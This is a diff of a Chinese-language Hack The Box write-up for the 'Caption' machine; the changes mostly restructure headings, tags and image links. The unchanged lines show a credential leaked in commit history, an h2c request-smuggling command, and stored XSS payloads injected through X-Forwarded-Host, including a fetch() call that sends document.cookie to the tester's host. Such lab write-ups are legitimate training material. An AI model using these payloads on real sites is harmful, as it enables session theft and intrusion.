@@ -1,10 +1,19 @@
 ---
 title: Caption
+tags:
+  - HTB
+  - Linux
+  - Hard
+  - H2C Smuggling
+  - Thrift
+  - Log Service
 pagination_prev: null
 pagination_next: null
 ---
 
-# 端口扫描
+## 信息收集
+
+### 端口扫描
 ~~~
 ┌──(kali㉿kali)-[~/htb/Caption]
 └─$ sudo nmap -sT --min-rate 2000 -p- 10.10.11.33 -oA nmap/ports
@@ -249,37 +258,41 @@ PORT     STATE SERVICE
 
 ~~~
 
-# 80
+### 80 端口 Web 信息收集
 是一个简单的登录框，尝试几组弱口令失败
-![](Pasted%20image%2020250205105700.png)
-# 8000
+![](Pasted_image_20250205105700.png)
+### 8000 端口
 8000端口扫出/root
 查找commit记录发现一组凭据 
 margo:vFr&cS2#0!
-![](Pasted%20image%2020250204162344.png)
+![](Pasted_image_20250204162344.png)
 
 利用凭据登录80端口的服务
 
-![](Pasted%20image%2020250205104939.png)
+![](Pasted_image_20250205104939.png)
 
 分析一下项目结构
 前端用haproxy转发流量到varnish缓存服务器，然后varnish再发送到后端服务器
 
-![](Pasted%20image%2020250205105917.png)
+![](Pasted_image_20250205105917.png)
 
 查看haproxy的配置文件
 将80端口的流量转发到6081端口
 
-![](Pasted%20image%2020250205111123.png)
+![](Pasted_image_20250205111123.png)
 
 查看varnish的配置文件
 后端服务器的端口是8000，大概率是flask？
 
-![](Pasted%20image%2020250205111509.png)
+![](Pasted_image_20250205111509.png)
 
 发现正在监听6081端口，同时启用了http2支持
 
-![](Pasted%20image%2020250205111715.png)
+![](Pasted_image_20250205111715.png)
+
+## 漏洞利用
+
+### H2C请求走私
 
 前后端http版本不一致可能会造成h2c走私漏洞
 
@@ -317,16 +330,16 @@ python h2csmuggler.py -x http://caption.htb http://caption.htb/download  -H "Coo
 
 查看访问/home界面的网络请求，有一个传递utm_source的过程
 
-![](Pasted%20image%2020250205120601.png)
+![](Pasted_image_20250205120601.png)
 
 分析一下数据包，这里返回的source可能是显示来源
 
-![](Pasted%20image%2020250205120756.png)
+![](Pasted_image_20250205120756.png)
 
 尝试添加请求头更改来源
 尝试了X-Fowwarded-For和X-Fowwarded-Host，发现会返回X-Fowwarded-Host的内容，因为这里返回的x-cache是miss，说明访问的是后端服务器，尝试利用XSS读取cookie
 
-![](Pasted%20image%2020250205120935.png)
+![](Pasted_image_20250205120935.png)
 
 闭合一下script
 
@@ -351,13 +364,13 @@ X-Forwarded-Host:"></script><script src=http://10.10.16.4/test.xss>123
 
 在访问firewalls时添加X-Forwarded-Host头，可以看到收到回应
 
-![](Pasted%20image%2020250205125401.png)
+![](Pasted_image_20250205125401.png)
 
 然后再次发送一个不带X-Forwarded-Host的请求，发现之前注入的脚本还在页面中
 。说明可以成功存储
 
 
-![](Pasted%20image%2020250205125532.png)
+![](Pasted_image_20250205125532.png)
 
 试一下固定一个获取cookie然后发送给我们的脚本
 
@@ -371,7 +384,7 @@ X-Forwarded-Host:"></script><script>fetch("http://10.10.16.4/?"+document.cookie)
 
 成功注入
 
-![](Pasted%20image%2020250205125751.png)
+![](Pasted_image_20250205125751.png)
 
 在本地收到cookie
 
@@ -439,7 +452,7 @@ Serving HTTP on 0.0.0.0 port 80 ...
 
 返回了copyparty的报错页面，试试找exp
 
-![](Pasted%20image%2020250205140131.png)
+![](Pasted_image_20250205140131.png)
 
 
 找到相关cve  CVE-2023-37474
@@ -587,6 +600,8 @@ Last login: Tue Sep 10 12:33:42 2024 from 10.10.14.23
 margo@caption:~$ whoami
 margo
 ~~~
+
+## 权限提升
 
 9090端口可能跑的logservice，尝试转发到本地
 
